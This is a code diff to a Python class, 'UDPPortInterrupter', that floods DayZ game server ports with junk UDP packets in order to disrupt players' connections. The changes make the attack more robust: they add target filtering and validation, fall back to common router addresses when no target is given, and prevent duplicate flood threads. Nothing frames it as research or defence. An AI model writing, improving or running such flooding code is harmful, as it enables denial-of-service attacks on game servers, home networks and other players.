@@ -142,20 +142,47 @@ class UDPPortInterrupter:
             
             # Use provided target IPs or all servers
             if target_ips:
-                targets = target_ips
+                targets = [ip for ip in target_ips if ip != "0.0.0.0" and ip != "127.0.0.1"]
             else:
-                targets = [server.ip for server in self.servers if server.ip != "0.0.0.0"]
-                if not targets:
-                    # Try to get local IP dynamically instead of hardcoded localhost
-                    try:
-                        import socket
-                        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-                            s.connect(("8.8.8.8", 80))
-                            local_ip = s.getsockname()[0]
-                            targets = [local_ip]
-                    except Exception as e:
-                        log_error(f"Failed to get local IP: {e}")
-                        targets = []  # Empty list instead of hardcoded localhost
+                targets = [server.ip for server in self.servers if server.ip != "0.0.0.0" and server.ip != "127.0.0.1"]
+                
+            # If no valid targets, try to get local network IPs
+            if not targets:
+                try:
+                    import socket
+                    # Get local IP
+                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+                        s.connect(("8.8.8.8", 80))
+                        local_ip = s.getsockname()[0]
+                        targets = [local_ip]
+                        log_info(f"Using local IP as target: {local_ip}")
+                except Exception as e:
+                    log_error(f"Failed to get local IP: {e}", 
+                             exception=e, category="udp_flood", severity="medium",
+                             context={"fallback_targets": ["192.168.1.1", "192.168.0.1", "10.0.0.1"]})
+                    # Try common local network ranges
+                    targets = ["192.168.1.1", "192.168.0.1", "10.0.0.1"]
+                    log_info(f"Using fallback targets: {targets}")
+            
+            # Final validation - ensure we have valid IPs
+            valid_targets = []
+            for target in targets:
+                try:
+                    # Basic IP validation
+                    parts = target.split('.')
+                    if len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts):
+                        if target not in ["0.0.0.0", "127.0.0.1"]:
+                            valid_targets.append(target)
+                except (ValueError, AttributeError):
+                    continue
+            
+            if not valid_targets:
+                log_error("No valid target IPs available for UDP interruption", 
+                         category="udp_flood", severity="high",
+                         context={"original_targets": targets, "valid_targets_count": 0})
+                return False
+            
+            targets = valid_targets
             
             log_info(f"🎮 Starting UDP interruption with {effective_drop_rate}% drop rate")
             log_info(f"🎮 Targets: {targets}")
@@ -167,15 +194,16 @@ class UDPPortInterrupter:
             
             # Start interruption threads for each target
             for target_ip in targets:
-                thread = threading.Thread(
-                    target=self._udp_interruption_worker,
-                    args=(target_ip, effective_drop_rate),
-                    daemon=True
-                )
-                thread.start()
-                self.active_interruptions[target_ip] = thread
+                if target_ip not in self.active_interruptions:
+                    thread = threading.Thread(
+                        target=self._udp_interruption_worker,
+                        args=(target_ip, effective_drop_rate),
+                        daemon=True
+                    )
+                    self.active_interruptions[target_ip] = thread
+                    thread.start()
             
-            # Start timer if specified
+            # Start timer if duration specified
             if duration > 0:
                 self.timer_active = True
                 timer_thread = threading.Thread(
@@ -185,7 +213,7 @@ class UDPPortInterrupter:
                 )
                 timer_thread.start()
             
-            log_info(f"✅ UDP interruption started for {len(targets)} targets")
+            log_info(f"✅ UDP interruption started on {len(targets)} targets")
             return True
             
         except Exception as e:
@@ -255,8 +283,13 @@ class UDPPortInterrupter:
             log_error(f"Failed to start UDP interruption worker: {e}")
     
     def _send_udp_flood_packets(self, target_ip: str, sock: socket.socket):
-        """Send UDP flood packets to disrupt connections"""
+        """Send UDP flood packets to target IP"""
         try:
+            # Validate target IP
+            if not target_ip or target_ip in ["0.0.0.0", "127.0.0.1"]:
+                log_warning(f"Invalid target IP for UDP flood: {target_ip}")
+                return
+            
             # Send to DayZ-specific ports
             for port in self.dayz_ports:
                 try:
@@ -269,8 +302,11 @@ class UDPPortInterrupter:
                         fake_data = b"X" * size
                         sock.sendto(fake_data, (target_ip, port))
                         
+                except socket.error as e:
+                    # Log but don't fail for individual port errors
+                    log_warning(f"UDP flood failed for {target_ip}:{port}: {e}")
                 except Exception as e:
-                    log_error(f"Failed to send UDP flood to {target_ip}:{port}: {e}")
+                    log_warning(f"UDP flood error for {target_ip}:{port}: {e}")
                     
         except Exception as e:
             log_error(f"UDP flood error for {target_ip}: {e}")
@@ -473,4 +509,7 @@ class UDPPortInterrupter:
     def set_timer_duration(self, duration: int):
         """Set timer duration in seconds (0 = no timer)"""
         self.timer_duration = max(0, duration)
-        log_info(f"✅ Timer duration set to {duration} seconds") 
+        log_info(f"✅ Timer duration set to {duration} seconds")
+
+# Global instance for shared access
+udp_port_interrupter = UDPPortInterrupter() 
